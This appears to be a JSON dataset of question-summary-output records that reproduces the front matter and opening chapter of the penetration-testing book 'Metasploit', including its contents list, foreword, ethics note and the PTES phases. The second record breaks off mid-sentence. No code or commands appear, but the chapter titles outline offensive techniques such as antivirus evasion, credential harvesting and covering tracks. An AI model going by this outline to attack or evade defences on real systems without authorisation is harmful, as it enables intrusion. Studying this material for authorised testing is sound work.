[
  {
    "input": "What is the main purpose and focus of the book \"Metasploit\" by David Kennedy, Jim O'Gorman, Devon Kearns, and Mati Aharoni?",
    "summary": "The book provides a comprehensive guide to the Metasploit Framework, covering penetration testing fundamentals, Metasploit basics, intelligence gathering, vulnerability scanning, and advanced exploitation techniques. It also includes chapters on Meterpreter, avoiding detection, client-side attacks, and building custom modules and exploits. The authors aim to balance technical knowledge with practical application, offering both a tutorial for beginners and a reference for experienced professionals.",
    "output": "METASPLOIT. Copyright © 2011 by David Kennedy, Jim O'Gorman, Devon Kearns, and Mati Aharoni\nAll rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic or\nmechanical, including photocopying, recording, or by any information storage or retrieval system, without the prior\nwritten permission of the copyright owner and the publisher.\n15 14 13 12 11 1 2 3 4 5 6 7 8 9\nISBN-10: 1-59327-288-X\nISBN-13: 978-1-59327-288-3\nPublisher: William Pollock\nProduction Editor: Alison Law\nCover Illustration: Hugh D’Andrade\nInterior Design: Octopod Studios\nDevelopmental Editors: William Pollock and Tyler Ortman\nTechnical Reviewer: Scott White\nCopyeditor: Lisa Theobald\nCompositors: Susan Glinert Stevens\nProofreader: Ward Webber\nIndexer: BIM Indexing & Proofreading Services\nFor information on book distributors or translations, please contact No Starch Press, Inc. directly:\nNo Starch Press, Inc.\n38 Ringold Street, San Francisco, CA 94103\nphone: 415.863.9900; fax: 415.863.9950; info@nostarch.com; www.nostarch.com\nLibrary of Congress Cataloging-in-Publication Data\nA catalog record of this book is available from the Library of Congress.\nNo Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and\ncompany names mentioned herein may be the trademarks oftheir respective owners. Rather than use a trademark\nsymbol with every occurrence of a trademarked name, we areusing the names only in an editorial fashion and to the\nbenefit of the trademark owner, with no intention of infringement of the trademark.\nThe information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been\ntaken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any liability to any\nperson or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the\ninformation contained in it.\nB R I E F C O N T E N T S\nForeword by HD Moore................................................................................................xiii\nPreface.......................................................................................................................xvii\nAcknowledgments.........................................................................................................xix\nIntroduction .................................................................................................................xxi\nChapter1: The Absolute Basics of Penetration Testing.........................................................1\nChapter2: Metasploit Basics............................................................................................7\nChapter3: Intelligence Gathering...................................................................................15\nChapter4: Vulnerability Scanning...................................................................................35\nChapter5: The Joy of Exploitation...................................................................................57\nChapter6: Meterpreter..................................................................................................75\nChapter7: Avoiding Detection.......................................................................................99\nChapter8: Exploitation Using Client-Side Attacks............................................................109\nChapter9: Metasploit Auxiliary Modules.......................................................................123\nChapter10: The Social-Engineer Toolkit.........................................................................135\nChapter11: Fast-Track.................................................................................................163\nChapter12: Karmetasploit...........................................................................................177\nChapter13: Building Your Own Module........................................................................185\nChapter14: Creating Your Own Exploits.......................................................................197\nChapter15: Porting Exploits to the Metasploit Framework................................................215\nChapter16: Meterpreter Scripting.................................................................................235\nChapter17: Simulated Penetration Test..........................................................................251\nAppendixA: Configuring Your TargetMachines.............................................................267\nAppendixB: Cheat Sheet.............................................................................................275\nIndex.........................................................................................................................285\nvi Brief Contents\nC O N T E N T S I N D E T A I L\nFOREWORD by HD Moore xiii\nPREFACE xvii\nACKNOWLEDGMENTS xix\nSpecial Thanks ........................................................................................................xx\nINTRODUCTION xxi\nWhy Do A Penetration Test? ...................................................................................xxii\nWhy Metasploit? ..................................................................................................xxii\nA Brief History of Metasploit ...................................................................................xxii\nAbout this Book.....................................................................................................xxiii\nWhat’s in the Book? ..............................................................................................xxiii\nA Note on Ethics ..................................................................................................xxiv\n1\nTHE ABSOLUTE BASICS OF PENETRATION TESTING 1\nThe Phases of the PTES ..............................................................................................2\nPre-engagement Interactions .........................................................................2\nIntelligence Gathering..................................................................................2\nThreat Modeling .........................................................................................2\nVulnerability Analysis ..................................................................................3\nExploitation ................................................................................................3\nPost Exploitation ..........................................................................................3\nReporting ...................................................................................................4\nTypes of Penetration Tests ..........................................................................................4\nOvert Penetration Testing .............................................................................5\nCovert Penetration Testing ............................................................................5\nVulnerability Scanners ..............................................................................................5\nPulling It All Together ................................................................................................6\n2\nMETASPLOIT BASICS 7\nTerminology ............................................................................................................7\nExploit .......................................................................................................8\nPayload .....................................................................................................8\nShellcode ...................................................................................................8\nModule ......................................................................................................8\nListener ......................................................................................................8\nMetasploit Interfaces .................................................................................................8\nMSFconsole ................................................................................................9\nMSFcli .......................................................................................................9\nArmitage ..................................................................................................11\nMetasploit Utilities ..................................................................................................12\nMSFpayload .............................................................................................12\nMSFencode ..............................................................................................13\nNasm Shell...............................................................................................13\nMetasploit Express and Metasploit Pro ......................................................................14\nWrapping Up ........................................................................................................14\n3\nINTELLIGENCE GATHERING 15\nPassive Information Gathering .................................................................................16\nwhois Lookups ..........................................................................................16\nNetcraft ...................................................................................................17\nNSLookup ................................................................................................18\nActive Information Gathering ...................................................................................18\nPort Scanning with Nmap ..........................................................................18\nWorking with Databases in Metasploit ........................................................20\nPort Scanning with Metasploit .....................................................................25\nTargeted Scanning .................................................................................................26\nServer Message Block Scanning..................................................................26\nHunting for Poorly Configured Microsoft SQL Servers ....................................27\nSSH Server Scanning .................................................................................28\nFTP Scanning ............................................................................................29\nSimple Network Management Protocol Sweeping .........................................30\nWriting a Custom Scanner ......................................................................................31\nLooking Ahead ......................................................................................................33\n4\nVULNERABILITY SCANNING 35\nThe Basic Vulnerability Scan ....................................................................................36\nScanning with NeXpose ..........................................................................................37\nConfiguration ...........................................................................................37\nImporting Your Report into the Metasploit Framework ....................................42\nRunning NeXpose Within MSFconsole .........................................................43\nScanning with Nessus .............................................................................................44\nNessus Configuration ................................................................................44\nCreating a Nessus Scan Policy ...................................................................45\nRunning a Nessus Scan..............................................................................47\nNessus Reports .........................................................................................47\nImporting Results into the Metasploit Framework............................................48\nScanning with Nessus from Within Metasploit ..............................................49\nSpecialty Vulnerability Scanners ...............................................................................51\nValidating SMB Logins ...............................................................................51\nScanning for Open VNC Authentication.......................................................52\nScanning for Open X11 Servers ..................................................................54\nUsing Scan Results for Autopwning ...........................................................................56\n5\nTHE JOY OF EXPLOITATION 57\nBasic Exploitation ...................................................................................................58\nmsf> show exploits ....................................................................................58\nmsf> show auxiliary ..................................................................................58\nviii Contents in Detail\nmsf> show options ....................................................................................58\nmsf> show payloads ..................................................................................60\nmsf> show targets .....................................................................................62\ninfo .........................................................................................................63\nset and unset ............................................................................................63\nsetg and unsetg.........................................................................................64\nsave ........................................................................................................64\nExploiting Your First Machine ..................................................................................64\nExploiting an Ubuntu Machine .................................................................................68\nAll-Ports Payloads: Brute Forcing Ports .......................................................................71\nResource Files ........................................................................................................72\nWrapping Up ........................................................................................................73\n6\nMETERPRETER 75\nCompromising a Windows XP Virtual Machine ..........................................................76\nScanning for Ports with Nmap ....................................................................76\nAttacking MS SQL .....................................................................................76\nBrute Forcing MS SQL Server ......................................................................78\nThe xp_cmdshell........................................................................................79\nBasic Meterpreter Commands .....................................................................80\nCapturing Keystrokes .................................................................................81\nDumping Usernames and Passwords ........................................................................82\nExtracting the Password Hashes ..................................................................82\nDumping the Password Hash ......................................................................83\nPass the Hash ........................................................................................................84\nPrivilege Escalation ................................................................................................85\nToken Impersonation...............................................................................................87\nUsing ps ...............................................................................................................87\nPivoting onto Other Systems ....................................................................................89\nUsing Meterpreter Scripts ........................................................................................92\nMigrating a Process...................................................................................92\nKilling Antivirus Software ...........................................................................93\nObtaining System Password Hashes ............................................................93\nViewing All Traffic on a Target Machine ......................................................93\nScraping a System ....................................................................................93\nUsing Persistence ......................................................................................94\nLeveraging Post Exploitation Modules .......................................................................95\nUpgrading Your Command Shell to Meterpreter .........................................................95\nManipulating Windows APIs with the Railgun Add-On ................................................97\nWrapping Up ........................................................................................................97\n7\nAVOIDING DETECTION 99\nCreating Stand-Alone Binaries with MSFpayload......................................................100\nEvading Antivirus Detection ...................................................................................101\nEncoding with MSFencode .......................................................................102\nMulti-encoding ........................................................................................103\nCustom Executable Templates ................................................................................105\nLaunching a Payload Stealthily................................................................................106\nContents in Detail ix\nPackers ...............................................................................................................107\nA Final Note on Antivirus Software Evasion .............................................................108\n8\nEXPLOITATION USING CLIENT-SIDE ATTACKS 109\nBrowser-Based Exploits .........................................................................................110\nHow Browser-Based Exploits Work ............................................................111\nLooking at NOPs .....................................................................................112\nUsing Immunity Debugger to Decipher NOP Shellcode .............................................112\nExploring the Internet Explorer Aurora Exploit ..........................................................116\nFile Format Exploits ..............................................................................................119\nSending the Payload ............................................................................................120\nWrapping Up ......................................................................................................121\n9\nMETASPLOIT AUXILIARY MODULES 123\nAuxiliary Modules in Use ......................................................................................126\nAnatomy of an Auxiliary Module............................................................................128\nGoing Forward ....................................................................................................133\n10\nTHE SOCIAL-ENGINEER TOOLKIT 135\nConfiguring the Social-Engineer Toolkit ...................................................................136\nSpear-Phishing Attack Vector .................................................................................137\nWeb Attack Vectors..............................................................................................142\nJava Applet ............................................................................................142\nClient-Side Web Exploits ..........................................................................146\nUsername and Password Harvesting ..........................................................148\nTabnabbing............................................................................................150\nMan-Left-in-the-Middle ..............................................................................150\nWeb Jacking ..........................................................................................151\nPutting It All Together with a Multipronged Attack........................................153\nInfectious Media Generator ...................................................................................157\nTeensy USB HID Attack Vector ...............................................................................157\nAdditional SET Features ........................................................................................160\nLooking Ahead ....................................................................................................161\n11\nFAST-TRACK 163\nMicrosoft SQL Injection .........................................................................................164\nSQL Injector—Query String Attack.............................................................165\nSQL Injector—POST Parameter Attack........................................................166\nManual Injection .....................................................................................167\nMSSQL Bruter .........................................................................................168\nSQLPwnage............................................................................................172\nBinary-to-Hex Generator ........................................................................................174\nMass Client-Side Attack ........................................................................................175\nA Few Words About Automation............................................................................176\nx Contents in Detail\n12\nKARMETASPLOIT 177\nConfiguration ......................................................................................................178\nLaunching the Attack.............................................................................................179\nCredential Harvesting ...........................................................................................181\nGetting a Shell .....................................................................................................182\nWrapping Up ......................................................................................................184\n13\nBUILDING YOUR OWN MODULE 185\nGetting Command Execution on Microsoft SQL ........................................................186\nExploring an Existing Metasploit Module .................................................................187\nCreating a New Module .......................................................................................189\nPowerShell .............................................................................................189\nRunning the Shell Exploit ..........................................................................190\nCreating powershell_upload_exec .............................................................192\nConversion from Hex to Binary .................................................................192\nCounters ................................................................................................194\nRunning the Exploit ..................................................................................195\nThe Power of Code Reuse .....................................................................................196\n14\nCREATING YOUR OWN EXPLOITS 197\nThe Art of Fuzzing ................................................................................................198\nControlling the Structured Exception Handler ...........................................................201\nHopping Around SEH Restrictions...........................................................................204\nGetting a Return Address ......................................................................................206\nBad Characters and Remote Code Execution ...........................................................210\nWrapping Up ......................................................................................................213\n15\nPORTING EXPLOITS TO THE METASPLOIT FRAMEWORK 215\nAssembly Language Basics ....................................................................................216\nEIP and ESP Registers...............................................................................216\nThe JMP Instruction Set .............................................................................216\nNOPs and NOP Slides ............................................................................216\nPorting a Buffer Overflow ......................................................................................216\nStripping the Existing Exploit .....................................................................218\nConfiguring the Exploit Definition ..............................................................219\nTesting Our Base Exploit ..........................................................................220\nImplementing Features of the Framework ....................................................221\nAdding Randomization ............................................................................222\nRemoving the NOP Slide ..........................................................................223\nRemoving the Dummy Shellcode ................................................................223\nOur Completed Module ...........................................................................224\nSEH Overwrite Exploit ..........................................................................................226\nWrapping Up ......................................................................................................233\nContents in Detail xi\n16\nMETERPRETER SCRIPTING 235\nMeterpreter Scripting Basics ..................................................................................235\nMeterpreter API ....................................................................................................241\nPrinting Output........................................................................................241\nBase API Calls ........................................................................................242\nMeterpreter Mixins ..................................................................................242\nRules for Writing Meterpreter Scripts ......................................................................244\nCreating Your Own Meterpreter Script ....................................................................244\nWrapping Up ......................................................................................................250\n17\nSIMULATED PENETRATION TEST 251\nPre-engagement Interactions ..................................................................................252\nIntelligence Gathering...........................................................................................252\nThreat Modeling ..................................................................................................253\nExploitation .........................................................................................................255\nCustomizing MSFconsole ......................................................................................255\nPost Exploitation ...................................................................................................257\nScanning the Metasploitable System ..........................................................258\nIdentifying Vulnerable Services .................................................................259\nAttacking Apache Tomcat .....................................................................................260\nAttacking Obscure Services ...................................................................................262\nCovering Your Tracks ...........................................................................................264\nWrapping Up ......................................................................................................266\nA\nCONFIGURING YOUR TARGET MACHINES 267\nInstalling and Setting Up the System .......................................................................267\nBooting Up the Linux Virtual Machines ....................................................................268\nSetting Up a Vulnerable Windows XP Installation .....................................................269\nConfiguring Your Web Server on Windows XP ...........................................269\nBuilding a SQL Server ..............................................................................269\nCreating a Vulnerable Web Application ....................................................272\nUpdating Back|Track ..............................................................................273\nB\nCHEAT SHEET 275\nMSFconsole Commands ........................................................................................275\nMeterpreter Commands ........................................................................................277\nMSFpayload Commands .......................................................................................280\nMSFencode Commands ........................................................................................280\nMSFcli Commands ...............................................................................................281\nMSF, Ninja, Fu ....................................................................................................281\nMSFvenom ..........................................................................................................281\nMeterpreter Post Exploitation Commands ................................................................282\nINDEX 285\nxii Contents in Detail\nF O R E W O R D\nInformation technology is a complex field, littered\nwith the half-dead technology of the past and an\never-increasing menagerie of new systems, software,\nand protocols. Securing today’s enterprise networks\ninvolves more than simply patch management, fire-\nwalls, and user education; it requires frequent real-\nworld validation of what works and what fails. This is\nwhat penetration testing is all about.\nPenetration testing is a uniquely challenging job. You are paid to think\nlike a criminal, to use guerilla tactics to your advantage, and to find the weak-\nest links in a highly intricate net of defenses. The things you find can be both\nsurprising and disturbing; penetration tests have uncovered everything from\nrogue pornography sites to large-scale fraud and criminal activity.\nPenetration testing is about ignoring an organization’s perception of\nitssecurity and probing its systems for weaknesses. The data obtained from a\nsuccessful penetration test often uncovers issues that no architecture review\nor vulnerability assessment would be able to identify. Typical findings include\nshared passwords, cross-connected networks, and troves of sensitive data sit-\nting in the clear. The problems created by sloppy system administration and\nrushed implementations often pose significant threats to an organization,\nwhile the solutions languish under a dozen items on an administrator’s to-do\nlist. Penetration testing highlights these misplaced priorities and identifies\nwhat an organization needs to do to defend itself from a real intrusion.\nPenetration testers handle a company’s most sensitive resources; they\ngain access to areas that can have dire real-world consequences if the wrong\naction is taken. A single misplaced packet can bring a factory floor to a halt,\nwith a cost measured in millions of dollars per hour. Failure to notify the\nappropriate personnel can result in an uncomfortable and embarrassing con-\nversation with the local police. Medical systems are one area that even the\nmost experienced security professionals may hesitate to test; nobody wants\ntobe responsible for mixing up a patient’s blood type in an OpenVMS main-\nframe or corrupting the memory on an X-ray machine running Windows XP.\nThe most critical systems are often the most exposed, and few system admin-\nistrators want to risk an outage by bringing down a database server to apply a\nsecurity patch.\nBalancing the use of available attack paths and the risk of causing dam-\nage is a skill that all penetration testers must hone. This process depends not\nonly on a technical knowledge of the tools and the techniques but also on a\nstrong understanding of how the organization operates and where the path\nof least resistance may lie.\nIn this book, you will see penetration testing through the eyes of four\nsecurity professionals with widely divergent backgrounds. The authors include\nfolks with experience at the top of the corporate security structure all the way\ndown to the Wild West world of underground exploit development and vulner-\nability research. There are a number of books available on penetration test-\ning and security assessments, and there are many that focus entirely on tools.\nThis book, however, strives for a balance between the two, covering the fun-\ndamental tools and techniques while also explaining how they play into the\noverall structure of a successful penetration testing process. Experienced\npenetration testers will benefit from the discussion of the methodology,\nwhich is based on the recently codified Penetration Test Execution Standard.\nReaders who are new to the field will be presented with a wealth of informa-\ntion not only about how to get started but also why those steps matter and\nwhat they mean in the bigger picture.\nThis book focuses on the Metasploit Framework. This open source\nplatform provides a consistent, reliable library of constantly updated exploits\nand offers a complete development environment for building new tools and\nautomating every aspect of a penetration test. Metasploit Express and Meta-\nsploit Pro, the commercial siblings of the Framework, are also represented in\nthis book. These products provide a different perspective on how to conduct\nand automate large-scale penetration tests.\nxiv Foreword\nThe Metasploit Framework is an infamously volatile project; the code\nbase is updated dozens of times every day by a core group of developers and\nsubmissions from hundreds of community contributors. Writing a book about\nthe Framework is a masochistic endeavor; by the time that a given chapter\nhas been proofread, the content may already be out of date. The authors\ntook on the Herculean task of writing this book in such a way that the con-\ntent will still be applicable by the time it reaches its readers.\nThe Metasploit team has been involved with this book to make sure that\nchanges to the code are accurately reflected and that the final result is as close\nto zero-day coverage of the Metasploit Framework as is humanly possible. We\ncan state with full confidence that it is the best guide to the Metasploit Frame-\nwork available today, and it will likely remain so for a long time. We hope you\nfind this book valuable in your work and an excellent reference in your trials\nahead.\nHD Moore\nFounder, The Metasploit Project\nForeword xv\nP R E F A C E\nThe Metasploit Framework has long been one of the\ntools most widely used by information security pro-\nfessionals, but for a long time little documentation\nexisted aside from the source code itself or comments\non blogs. That situation changed significantly when\nOffensive-Security developed its online course, Meta-\nsploit Unleashed. Shortly after the course went live, No\nStarch Press contacted us about the possibly of creat-\ning a book to expand on our work with Metasploit\nUnleashed.\nThis book is designed to teach you the ins and outs of Metasploit and\nhow to use the Framework to its fullest. Our coverage is selective—we won’t\ncover every single flag or exploit—but we give you the foundation you’ll need\nto understand and use Metasploit now and in future versions.\nWhen we began writing this book, we had in mind a comment by HD\nMoore, developer of the Metasploit Framework. In a conversation with HD\nabout the development of our Metasploit Unleashed course, one of us said\ntohim, “I hope the course comes out good.” To this offhand comment, HD\nmerely replied, “Then make sure it is good.” And that’s just what we’ve\nattempted to do with this book.\nAs a group, we are experienced penetration testers who use Metasploit\ndaily to circumvent security controls, bypass protections, and attack systems\nmethodically. We wrote this book with the intention of helping our readers\nbecome competent penetration testers. HD’s drive and focus on quality is\napparent within the Metasploit Framework, and we have tried to match those\ncharacteristics in this book. We leave it up to you to judge how well we have\nlived up to that standard.\nxviii Preface\nA C K N O W L E D G M E N T S\nWe would like to thank a number of people, begin-\nning with the folks whose hard work provides the\ncommunity with an invaluable tool. Special thanks to\nthe Metasploit Team: HD Moore, James Lee, David\nD. Rude II, Tod Beardsley, Jonathan Cran, Stephen\nFewer, Joshua Drake, Mario Ceballos, Ramon Valle,\nPatrick Webster, Efrain Torres, Alexandre Maloteaux, Wei Chen, Steve Tornio,\nNathan Keltner, Chris Gates, Carlos Perez, Matt Weeks, and Raphael Mudge.\nAlso an extra thanks to Carlos Perez for his assistance inwriting portions of\nthe Meterpreter scripting chapter.\nMany thanks to Scott White, technical reviewer for this book, for being\nawesome.\nThanks to Offensive-Security for bringing us all together. The Offensive-\nSecurity trademark phrase “Try Harder” alternately inspires and tortures us\n(ryujin is evil).\nWe have many other members of the information security community\ntothank, but there are too many to list and the odds of missing someone are\nhigh. So thank you to our friends in the security community; hugs from all\nofus.\nA very special thanks to the whole crew at No Starch Press for their\nimmeasurable effort. Bill, Alison, Travis, and Tyler, it has been a pleasure\nworking with you and everyone else behind the scenes at No Starch Press!\nFinally, a big thank you to our families. We are all married and half of\nushave children. We spend far too long wearing down the plastic on our\nkeyboards and not enough time with them. To our families, thanks for your\nunderstanding; we will make it up to you—as soon as we update this next\nlineof code, or find the source of this memory corruption, or finish this svn\nupdate, or get this next fuzzer run setup, or . . .\nSpecial Thanks\nDave (Twitter: @dave_rel1k): I dedicate my work on this book to my loving\nwife Erin, who tolerated late nights of me hammering away at the keyboard.\nTo my three children who keep me young and old at the same time. To my\nfather, Jim; my mother, Janna; and my stepmother, Deb, for being there for\nme and making me what I am today. Thanks to Jim, Dookie, and Muts for\ntheir hard work on the book and for being great friends! To my good friends\nat Offensive-Security; Chris “Logan” Hadnagy; my brother, Shawn Sullivan;\nand my team at Diebold. To my good friend HD Moore, whose dedication to\nthe security industry is an inspiration to us all. To all my friends in life, and to\nScott Angelo for giving me an opportunity and believing in me. Lastly, to\nGod, without whom none of this would be possible.\nDevon (@dookie2000ca): For my beautiful and tolerant wife, who not\nonly supports but encourages my mania. You are my inspiration and motiva-\ntion; without you by my side in these pursuits, I would never get anywhere.\nTo my co-authors, thank you for having faith in a newcomer and welcoming\nme as one of your own. Lastly, an especially big thank you to Mati for not\nonly getting this merry band together but for giving me a chance.\nMuts (@backtracklinux): A special thanks to the co-authors of this book,\nwhose time and dedication to it is truly inspiring. I count Jim, Devon, and\nDave as great friends and colleagues in the security field.\nJim (@_Elwood_): Thanks to Matteo, Chris “Logan,” and the entire\nOffensive-Security crew. Also a big thanks to Robert, Matt, Chris, and my\nco-workers at StrikeForce. And to my wonderful wife Melissa: The book you\nhold in your hands is proof that I was not just avoiding housework all the time.\nAnd to Jake and Joe, please don’t tell Mom that I am just playing games with\nyou when I tell her I am working. You three are the Pack-a-Punch to my life.\nAnd finally to my co-authors Mati, Devon, and Dave: Thanks for letting me\nput my name on this book—I really was just avoiding housework.\nxx Acknowledgments\nI N T R O D U C T I O N\nImagine that sometime in the not-so-distant future an\nattacker decides to attack a multinational company’s\ndigital assets, targeting hundreds of millions of dollars\nworth of intellectual property buried behind millions\nof dollars in infrastructure. Naturally, the attacker\nbegins by firing up the latest version of Metasploit.\nAfter exploring the target’s perimeter, he finds a soft spot and begins a\nmethodical series of attacks, but even after he’s compromised nearly every\naspect of the network, the fun has only just begun. He maneuvers through\nsystems, identifying core, critical business components that keep the com-\npany running. With a single keystroke, he could help himself to millions of\ncompany dollars and compromise all their sensitive data.\nCongratulations on a job well done—you’ve shown true business impact,\nand now it’s time to write the report. Oddly enough, today’s penetration\ntesters often find themselves in the role of a fictitious adversary like the one\ndescribed above, performing legal attacks at the request of companies that\nneed high levels of security. Welcome to the world of penetration testing and\nthe future of security.\nWhy Do a Penetration Test?\nCompanies invest millions of dollars in security programs to protect critical\ninfrastructures, identify chinks in the armor, and prevent serious data breaches.\nA penetration test is one of the most effective ways to identify systemic weak-\nnesses and deficiencies in these programs. By attempting to circumvent secu-\nrity controls and bypass security mechanisms, a penetration tester is able to\nidentify ways in which a hacker might be able to compromise an organization’s\nsecurity and damage the organization as a whole.\nAs you read through this book, remember that you’re not necessarily\ntargeting one system or multiple systems. Your goal is to show, in a safe and\ncontrolled manner, how an attacker might be able to cause serious harm to\nan organization and impact its ability to, among other things, generate reve-\nnue, maintain its reputation, and protect its customers.\nWhy Metasploit?\nMetasploit isn’t just a tool; it’s an entire framework that provides the infra-\nstructure needed to automate mundane, routine, and complex tasks. This\nallows you to concentrate on the unique or specialized aspects of penetration\ntesting and on identifying flaws within your information security program.\nAs you progress through the chapters in this book and establish a well-\nrounded methodology, you will begin to see the many ways in which Meta-\nsploit can be used in your penetration tests. Metasploit allows you to easily\nbuild attack vectors to augment its exploits, payloads, encoders, and more\ninorder to create and execute more advanced attacks. At various points in\nthis book we explain several third-party tools—including some written by the\nauthors of this book—that build on the Metasploit Framework. Our goal is to\nget you comfortable with the Framework, show you some advanced attacks,\nand ensure that you can apply these techniques responsibly. We hope you\nenjoy reading this book as much as we enjoyed creating it. Let the fun and\ngames begin.\nA Brief History of Metasploit\nMetasploit was originally developed and conceived by HD Moore while he\nwas employed by a security firm. When HD realized that he was spending\nmost of his time validating and sanitizing public exploit code, he began to\ncreate a flexible and maintainable framework for the creation and develop-\nment of exploits. He released his first edition of the Perl-based Metasploit\ninOctober 2003 with a total of 11 exploits.\nWith the help of Spoonm, HD released a total rewrite of the project,\nMetasploit 2.0, in April 2004. This version included 19 exploits and over 27\npayloads. Shortly after this release, Matt Miller (Skape) joined the Metasploit\ndevelopment team, and as the project gained popularity, the Metasploit Frame-\nwork received heavy backing from the information security community and\nquickly became a necessary tool for penetration testing and exploitation.\nxxii Introduction\nFollowing a complete rewrite in the Ruby programming language,\ntheMetasploit team released Metasploit 3.0 in 2007. The migration of the\nFramework from Perl to Ruby took 18 months and resulted in over 150,000\nlines of new code. With the 3.0 release, Metasploit saw widespread adoption\nin the security community and a big increase in user contributions.\nIn fall 2009, Metasploit was acquired by Rapid7, a leader in the\nvulnerability-scanning field, which allowed HD to build a team to focus\nsolelyon the development of the Metasploit Framework. Since the acquisi-\ntion, updates have occurred more rapidly than anyone could have imagined.\nRapid7 released two commercial products based on the Metasploit Frame-\nwork: Metasploit Express and Metasploit Pro. Metasploit Express is a lighter\nversion of the Metasploit Framework with a GUI and additional functionality,\nincluding reporting, among other useful features. Metasploit Pro is an expanded\nversion of Metasploit Express that touts collaboration and group penetration\ntesting and such features as a one-click virtual private network (VPN) tunnel\nand much more.\nAbout This Book\nThis book is designed to teach you everything from the fundamentals of\ntheFramework to advanced techniques in exploitation. Our goal is to pro-\nvide a useful tutorial for the beginner and a reference for practitioners. How-\never, we won’t always hold your hand. Programming knowledge is a definite\nadvantage in the penetration testing field, and many of the examples in this\nbook will use either the Ruby or Python programming language. Still, while\nwe suggest that you learn a language like Ruby or Python to aid in advanced\nexploitation and customization of attacks, programming knowledge is not\nrequired.\nAs you grow more comfortable with Metasploit, you will notice that the\nFramework is frequently updated with new features, exploits, and attacks.\nThis book was developed with the knowledge that Metasploit is continually\nchanging and that no printed book is likely to be able to keep pace with this\nrapid development. Therefore, we focus on the fundamentals, because once\nyou understand how Metasploit works you will be able to ramp up quickly\nwith updates to the Framework.\nWhat’s in the Book?\nHow can this book help you to get started or take your skills to the next level?\nEach chapter is designed to build on the previous one and to help you build\nyour skills as a penetration tester from the ground up.\n(cid:122) Chapter 1, “The Absolute Basics of Penetration Testing,” establishes the\nmethodologies around penetration testing.\n(cid:122) Chapter 2, “Metasploit Basics,” is your introduction to the various tools\nwithin the Metasploit Framework.\n(cid:122) Chapter 3, “Intelligence Gathering,” shows you ways to leverage Meta-\nsploit in the reconnaissance phase of a penetration test.\nIntroduction xxiii\n(cid:122) Chapter 4, “Vulnerability Scanning,” walks you through identifying vul-\nnerabilities and leveraging vulnerability scanning technology.\n(cid:122) Chapter 5, “The Joy of Exploitation,” throws you into exploitation.\n(cid:122) Chapter 6, “Meterpreter,” walks you through the Swiss Army knife of\npost exploitation: Meterpreter.\n(cid:122) Chapter 7, “Avoiding Detection,” focuses on the underlying concepts of\nantivirus evasion techniques.\n(cid:122) Chapter 8, “Exploitation Using Client-Side Attacks,” covers client-side\nexploitation and browser bugs.\n(cid:122) Chapter 9, “Metasploit Auxiliary Modules,” walks you through auxiliary\nmodules.\n(cid:122) Chapter 10, “The Social-Engineer Toolkit,” is your guide to leveraging\nthe Social-Engineer Toolkit in social-engineering attacks.\n(cid:122) Chapter 11, “Fast-Track,” offers a complete run down on Fast-Track, an\nautomated penetration testing framework.\n(cid:122) Chapter 12, “Karmetasploit,” shows you how to leverage Karmetasploit\nfor wireless attacks.\n(cid:122) Chapter 13, “Building Your Own Modules,” teaches you how to build\nyour own exploitation module.\n(cid:122) Chapter 14, “Creating Your Own Exploits,” covers fuzzing and creating\nexploit modules out of buffer overflows.\n(cid:122) Chapter 15, “Porting Exploits to the Metasploit Framework,” is an in-\ndepth look at how to port existing exploits into a Metasploit-based module.\n(cid:122) Chapter 16, “Meterpreter Scripting,” shows you how to create your own\nMeterpreter scripts.\n(cid:122) Chapter 17, “Simulated Penetration Test,” pulls everything together as it\nwalks you through a simulated penetration test.\nA Note on Ethics\nOur goal in writing this book is to help you to improve your skills as a pene-\ntration tester. As a penetration tester, you will be bypassing security measures;\nthat’s simply part of the job. When you do, keep the following in mind:\n(cid:122) Don’t be malicious.\n(cid:122) Don’t be stupid.\n(cid:122) Don’t attack targets without written permission.\n(cid:122) Consider the consequences of your actions.\n(cid:122) If you do things illegally, you can be caught and put in jail!\nNeither the authors of this book nor No Starch Press, its publisher,\ncondones or encourages the misuse of the penetration testing techniques\ndiscussed herein. Our goal is to make you smarter, not to help you to get\nintotrouble, because we won’t be there to get you out.\nxxiv Introduction"
  },
  {
    "input": "What are the seven phases of the Penetration Testing Execution Standard (PTES) and what is the purpose of each phase in a penetration test?",
    "summary": "Penetration testing involves simulating real-world attacks to test an organization's security. It requires more than just using automated tools and includes years of practice to become proficient. The Penetration Testing Execution Standard (PTES) is redefining penetration testing by establishing a framework for standardized testing phases. These phases include pre-engagement interactions, intelligence gathering, threat modeling, vulnerability analysis, exploitation, and post exploitation, each with specific goals and methods to ensure a thorough and effective security assessment.",
    "output": "T H E A B S O L U T E B A S I C S O F\nP E N E T R A T I O N T E S T I N G\nPenetration testing is a way for you to simulate the\nmethods that an attacker might use to circumvent\nsecurity controls and gain access to an organization’s\nsystems. Penetration testing is more than running scan-\nners and automated tools and then writing a report.\nAnd you won’t become an expert penetration tester\novernight; it takes years of practice and real-world\nexperience to become proficient.\nCurrently, there is a shift in the way people regard and define penetra-\ntion testing within the security industry. The Penetration Testing Execution\nStandard (PTES) is redefining the penetration test in ways that will affect\nboth new and experienced penetration testers, and it has been adopted by\nseveral leading members of the security community. Its charter is to define\nand raise awareness about what a true penetration test means by establishing\na baseline of fundamental principles required to conduct a penetration test.\nIf you’re new to penetration testing or unfamiliar with PTES, visit http://\nwww.pentest-standard.org/ to learn more about it.\nThe Phases of the PTES\nPTES phases are designed to define a penetration test and assure the client\norganization that a standardized level of effort will be expended in a pene-\ntration test by anyone conducting this type of assessment. The standard is\ndivided into seven categories with different levels of effort required for each,\ndepending on the organization under attack.\nPre-engagement Interactions\nPre-engagement interactions typically occur when you discuss the scope and terms\nof the penetration test with your client. It is critical during pre-engagement\nthat you convey the goals of the engagement. This stage also serves as your\nopportunity to educate your customer about what is to be expected from a\nthorough, full-scope penetration test—one without restrictions regarding what\ncan and will be tested during the engagement.\nIntelligence Gathering\nIn the intelligence gathering phase, you will gather any information you can\nabout the organization you are attacking by using social-media networks,\nGoogle hacking, footprinting the target, and so on. One of the most impor-\ntant skills a penetration tester can have is the ability to learn about a target,\nincluding how it behaves, how it operates, and how it ultimately can be attacked.\nThe information that you gather about your target will give you valuable\ninsight into the types of security controls in place.\nDuring intelligence gathering, you attempt to identify what protection\nmechanisms are in place at the target by slowly starting to probe its systems.\nFor example, an organization will often only allow traffic on a certain subset of\nports on externally facing devices, and if you query the organization on any-\nthing other than a whitelisted port, you will be blocked. It is generally a good\nidea to test this 